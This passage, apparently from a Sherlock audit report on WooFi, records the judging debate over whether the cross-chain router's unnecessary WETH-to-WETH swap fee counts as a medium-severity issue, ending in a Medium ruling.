+Here is the KEY PART, we are not using 1inch for the swap and we specified WooPP pool as the exchange to use. So [this block of code](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L347) will be executed.
+
+The swap will be `WETH => toToken` as you can see in the [next line](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L349). But `toToken` can also be WETH.
+
+And as the in the code I added to my [original issue](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/95), inside the: ***See swap the same `from` and `to` tokens via WooRouterV2 👁️*** section. The WooPP pool allows for execution of "same-token" swaps even if they dont make sense. Like our now `WETH => WETH` swap.
+
+In those executions you can see in the code I provided that a fee is also charged in the WooPP pool. This fee is the one that makes no sense to charge to the user as they already have the `toTokend` desired which is `WETH`.
+
+Finally add that this makes sense if you are bridging for example to Arbitrum, a chain supported by the protocol.
+
+The key points you might be missing are:
+
+1. The swap is not done via 1inch but via WooPP pool. And this allows for the "same-token" WETH => WETH unnecessary swap that involves the fee any swap on WooPP is charged.
+
+2. `sgEth` is given by the bridge to the corss-chain-router, but not as an ERC20 but as native coin through `msg.value`. That is why is later wrapped up to `WETH` to proceed with the swap in case you specified an ERC20 as `toToken`, but this `toToken` can be WETH and then the extra fee is charged.
+
+---
+
+## 1. 
+(from discrod chat)
+I don't agree on it is a UX problem. I couldn't find anywhere where it says you can't bridge `WETH` uing `sgETH` as `bridgeToken` using `WooPP` for the destination swap. The only limits on tokens you can use according to the protocol are the ones on their `IntegrationHelper` contract and the ones supported by the external brige they use (Stargate).
+
+And WETH is supported in WooPP pool and can be bridged to Arbitrum (supported by the protocol) via stargate. As you can see in their [contract deployed](https://arbiscan.io/address/0x28D2B949024FE50627f1EbC5f0Ca3Ca721148E40#readContract) on `getSupportedTokens()`, [the WETH Arbitrum address](https://arbiscan.io/token/0x82af49447d8a07e3bd95bd0d56f35241523fbab1) is among them. The only restriction I could find in bridging is that you can't use the native coin as `bridgeToken`, you gotta use sgETH or sgVersion. So, under all restrictions the protocol and team set, this is a valid user interaction which results in loss of funds due to unnecessary fee.
+
+I will make an analogy with a car. If you buy a car and the seller tells you that the car can drive in uneven pavements but then you drive it in uneven pavement made of sand and the car gets some damange then it's not your UX fault because as far as you were told, the car works on uneven pavements. It said nothing about the sand, in fact is a family car and it is expected to probably go on beach holidays some times.
+
+So to sum up I don't agree with the argument that it is a UX problem becaues the developers never said they forbid swapping WETH in their pool or bridging it as `toToken`. In fact all indicates this is expected because WETH is approved as a token to be used in the WooPP and there are no filters for forbiding it in the bridge function either.
+
+## 2.
+(from discrod chat)
+About the it's a small and finite amount. It depends what you consider small and finite. The WooPP pool charges a % fee, and depending on the size of the swap the % might be small but the absolute amount can be considered big.  
+ 
+This is very similar to what I wrote before in [issue 97 comment section 2](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/97#issuecomment-2041615772), adapted for this issue would be: My agreement with the argument of small defined loss depends on how sherlok defines a small finite loss. This could be considered small in terms of percentage as the loss will be as big as the protocols' fee charged for swapping on WooPP pool, which is a small % (lets say 1% or even 0.05%). 
+
+Now despite of that a 1% loss on let's imagine a traded amount of 1 million dollars would be 10K of loss which is quite an amount of money to lose (or 5K in the 0.05% case). So idk how Sherlok defines finite small loss, in absolute terms or proportional terms.
+
+If it is in proportional termns then okay it's a small loss, you lost 10K while managing 1 million due to code issues. But if it is absolute terms I do not think 10K or 5K is a small loss.
+
+As it is a percentage of the swapped amount, it can be considered proportionally low. But in absolute terms the amount lost can be seen as big, like the 10K loss explained. Also if we add the time factor, over time, all people using this option of bridging where this swap is unnecesarily done the amount of money lost will be accumulating and can get big. Anyway to sum up, depending on the nuance of how you define small and finite loss I would agree or disagree with the argument.
+
+## 3.
+(from discrod chat)
+I don't think fixing the issue adds a lot of complexity. As it can seen in the ***Recommendation*** section a simple `if` statement would fix the issue. As much, the `if` with a comment saying, if the `toToken` desired was `WETH` there is no need to swap and just send the token.
+
+## 4.
+(from discrod chat)
+I understand as "core functionalities" of this audit: their WooPP pool usage with the sPMM algorithm and cross-chain swaps. This is a valid cross-chain swap. Otherwise why would they bother to add the cross-chain contracts to the audit.
+
+These are all the arguments and counterarguments given on discord for this issue.
+
+**WangSecurity**
+
+Thank you for such an insightful comment!
+
+The reasons why I still think it should remain low since it's essentially works as it should be.
+
+The inputs that the Watson uses in his examples are:
+
+fromToken => any
+birdgeToken => sgEth
+toToken => WETH
+dst1inch.swapRouter = WooPP pool
+
+Therefore, I assume that we charge the fee here as expected since sgETH and WETH are technically different tokens even tho we can say they're quite the same. Therefore, I believe it would be nice to not charge the fee in that case, but I cannot say anything it broken here.
+
+Moreover, I think the rule of financial loss to exceed small and finite amounts can be applied here since it's a small percentage of the swap (but I may be applying it here incorrectly). Therefore, I think it in facts work as expected, but the report is improving the protocol a bit. Don't get me wrong, it's a nice finding, but I don't see it as medium, unfortunately.
+
+I admit that I may be wrong in my assumptions and will take any decision from the head of Judging, but I believe it's not sufficient to be medium (thank you for such and insightful explanation G, it looks very good).
+
+**Czar102**
+
+I believe the current system may work suboptimally with sgETH and WETH, and the recommendation would remove that suboptimal behavior. But design improvements aren't security issues, and I consider this report to be informational.
+
+As @WangSecurity mentioned:
+> Therefore, I assume that we charge the fee here as expected since sgETH and WETH are technically different tokens even tho we can say they're quite the same. Therefore, I believe it would be nice to not charge the fee in that case, but I cannot say anything it broken here.
+
+Planning to reject the escalation and leave the issue as is.
+
+**CarlosAlegreUr**
+
+> I believe the current system may work suboptimally with sgETH and WETH, and the recommendation would remove that suboptimal behavior. But design improvements aren't security issues, and I consider this report to be informational.
+> 
+> As @WangSecurity mentioned:
+> 
+> > Therefore, I assume that we charge the fee here as expected since sgETH and WETH are technically different tokens even tho we can say they're quite the same. Therefore, I believe it would be nice to not charge the fee in that case, but I cannot say anything it broken here.
+> 
+> Planning to reject the escalation and leave the issue as is.
+
+@Czar102 and @WangSecurity , thanks for your point of view, but I still don't agree, these are my reasons:
+
+## 1.
+
+When `msg.value` is used, the native coin, lets say ether in **Arbitrum** example. In that case there is no fee charged, even if the native coin ***ether***. We can also say about **ether** to be: "technically different tokens even tho we can say they're quite the same".
+
+Thus we can see that when receiving the same or similar a asset to **sgEth** in **dstChain** no swap is expected to be performed by the code. Thus same would apply to WETH.
+
+
+## 2.
+
+Lets say that, doesnt matter if they are similar, they are in fact different tokens and a swap fee should be taken. In that case the swap fee taken should be because of a swap `sgETH => WETH`, and not `WETH => WETH`. This is problematic as differnet swaps gather differents amount of fees thus even in this path, the user would be charged something he didn't pay for.
+
+**WooPP** pool does not allow for `sgETH` to be swapped. As we cann see [sgEth on Arbitrum](https://arbiscan.io/address/0x82cbecf39bee528b5476fe6d1550af59a9db6fc0) is not expected in the [supported tokens](https://arbiscan.io/address/0x28D2B949024FE50627f1EbC5f0Ca3Ca721148E40#readContract) function mentioned during the dicussions. But even if they indeed supported it, in **WooPP** [different tokens](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L83) have [different feeRates](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L64) so, for example swaping `ValidToken1 => ValidToken2` is no the same as swapping `ValidToken2 => ValidToken3`. So it would actually matter if the swap is `sgETH => WETH` or `WETH => WETH`, thus the code would still be charging incorrect amounts to clients.
+
+In the other hand, in case of using **1inch** same applies, nothing guarantees that the fee charged for a swap `sgETH => WETH` is the same as the fee charged for a swap `WETH => WETH` (if the latter is posible in 1inch) so users would be charged incorrect amount of fees in this case. Although this case `sgETH => WETH` can't be executed because the [WETH address is hardoced](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L309) in both swaps, whether trhough **1inch** or [WooPP swap](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L349).
+
+## Sum-up
+
+No matter what, the conclusion I take is that fee should not be charged. First because I think the code clearly treats "quite the same" tokens as no need to swap. And second, even if lets say we must swap, the fees would be incorrect.
+
+I don't see it as suboptimal behaviour but as an issue in the code charging fees that it should not charge and that didn't expect.
+
+**Czar102**
+
+@CarlosAlegreUr I don't quite understand your second point. Could you explain it in a different way? Preferably as a short summary?
+
+**CarlosAlegreUr**
+
+> @CarlosAlegreUr I don't quite understand your second point. Could you explain it in a different way? Preferably as a short summary?
+
+@Czar102 
+
+So, I don't think a fee should be charged if from bridged `sgEth` we eventually want `WETH` because I think the code is not meant to do that for the reasons mentioned in point **1** in the comment above.
+
+But, assusming your position of a fee should be charged, there would still be a problem. As the swap made in the code would be `WETH => WETH` and not `sgEth => WETH`. The protocol's pool **WooPP** charges different fees for different assets swaped, so the fee for `WETH => WETH` would be different than the fee for `sgEth => WETH`. So, even if we assume a fee should be charged, the code would still be charging incorrect fees. (a similar thing appliess to **1inch** swap)
+
+Thus, `sgEth` as `bridgeToken` and `WETH` as `toToken` would still have incorrect fee behaviour.
+
+**WangSecurity**
+
+Do I understand correctly that when it comes to [`handleNativeReceive`](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L269), we skip the first check `if (toToken == ETH_PLACEHOLDER_ADDR)` at L279, cause our toToken is not ETH. 
+
+After it at line 299 we wrap msg.value into WETH and then at lines 306 or 349 we swap WETH to WETH, even tho the bridge token was sgETH, the function still wraps it into WETH before swapping into WETH. Correct?
+
+And another question, can you forward to lines of code where it handles swap from sgETH to WETH and WETH to WETH to see how the fees differ (sorry if you already sent it, cannot find). 
+
+**CarlosAlegreUr**
+
+> Do I understand correctly that when it comes to [`handleNativeReceive`](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/CrossChain/WooCrossChainRouterV4.sol#L269), we skip the first check `if (toToken == ETH_PLACEHOLDER_ADDR)` at L279, cause our toToken is not ETH.
+> 
+> After it at line 299 we wrap msg.value into WETH and then at lines 306 or 349 we swap WETH to WETH, even tho the bridge token was sgETH, the function still wraps it into WETH before swapping into WETH. Correct?
+> 
+> And another question, can you forward to lines of code where it handles swap from sgETH to WETH and WETH to WETH to see how the fees differ (sorry if you already sent it, cannot find).
+
+Your understanding and description are right indeed.:
+
+> After it at line 299 we wrap msg.value into WETH and then at lines 306 or 349 we swap WETH to WETH, even tho the bridge token >
+> was sgETH, the function still wraps it into WETH before swapping into WETH. Correct?
+
+Second, the code does not do that. I was describing a hypothetical scenario trying to show that even if actually a fee had to be charged, the fee would be incorrect as **WooPP** charges different fees according to the token type. I added a link to the storage variables that handle this: [tokenInfos](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L83) storage, which points to a [TokenInfo](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L64) struct with a [feeRate](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L66). By the way in `feeRate` don't get confused with the comment nex to it: `// 1 in 100000; 10 = 1bp = 0.01%; max = 65535`, this doesnt mean that the `feeRate` value is 1 in 100000, it is just how devs marked the decimals of precision.
+
+So even in the hypothetical scenario that the code actually expects a swap (which I dont think it does by the resons provided earlier), the fee charged would be incorrect as it would be a `WETH => WETH` swap fee and not a `sgETH => WETH` swap fee.
+
+**WangSecurity**
+
+Then, as I've said earlier the only problem for me here is I don't really see it exceed small and finite amounts. It's not clear how to interpret this rule, cause hypothetically the fee will be around 0.05 - 0.1% as the Watson said earlier. Therefore, it seems to be small amout. But if it's 1M swap then the fee will be quite high, even tho it's only 0.05-0.1%. 
+
+Thus, if the head of judging decides that it should be valid, I will agree and accept the decision. I see where incorrect fees are taken the only problem is that I'm unsure we can say it exceeds small and finite amounts as the rules for medium say. Also, I guess it may be considered core functionality break, since we account not the fees we have to account. And for that, I also rely on the head of judging, cause I'm unsure how we should interpret the rules in that specific case.
+
+And for the Watson, thank you for being so polite and calm, giving such thorough responses! It's a pleasure.
+
+**fb-alexcq**
+
+Okay. `toToken` could not be WETH in our server logic, and it won't happen. Also it's pretty hard to manually construct the param and interact with smart contract directly.
+
+However, in technically aspect, when `toToken` is WETH, our current contract will fail the TX, and we need manually refund the user. So the issue posted here makes sense, but I'll let judges decide the priority level.
+
+**WangSecurity**
+
+Based on the comment by the sponsor above, as I understand the issue should indeed remain low/info since it'll be user mistake. Looping in the watson @CarlosAlegreUr if they can provide their opinion. But based on above, I believe it should remain low.
+
+**CarlosAlegreUr**
+
+> Based on the comment by the sponsor above, as I understand the issue should indeed remain low/info since it'll be user mistake. Looping in the watson @CarlosAlegreUr if they can provide their opinion. But based on above, I believe it should remain low.
+
+Based on @fb-alexcq comments. I understand that their server and/or UI won't have by default the option of **WETH** as `toToken`. So it won't be an worry if the user uses the official site I guess. 
+
+So only apps building on top of the protocol would be affected by this as there are no warnings or restrictions in the system's interface, docs or code to the WETH case. And, in my opinion, protocols that build on top of yours are also valid users doing valid actions and in this time, with invalid results.
+
+I don't see it as a user mistake, I see it as a failed promise from the protocol's side that can cost, specially to apps building on top of the protocol, some money. So if user mistake is the reason for it to be a Low, as I don't think it is a user mistake, I don't think it is a Low.
+
+**Evert0x**
+
+Result:
+Medium
+Unique
+
+---
+
+Medium as it's clear that ANY token (including WETH) is supported, the unnecessary swap fee (0.05 - 0.1%) is pretty significant loss for users. 
+
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [WangSecurity](https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/95/#issuecomment-2041585464): accepted
+
+**WangSecurity**
+
+@CarlosAlegreUr want to again thank you for being very responsive and allocating so much time to correctly resolve this escalation. Great finding honestly, just wasn't sure how to correctly interpret it. Thank you very much again!
+
+# Issue M-8: In the function _handleERC20Received, the fee was incorrectly charged 
 
 Source: https://github.com/sherlock-audit/2024-03-woofi-swap-judging/issues/114 
 
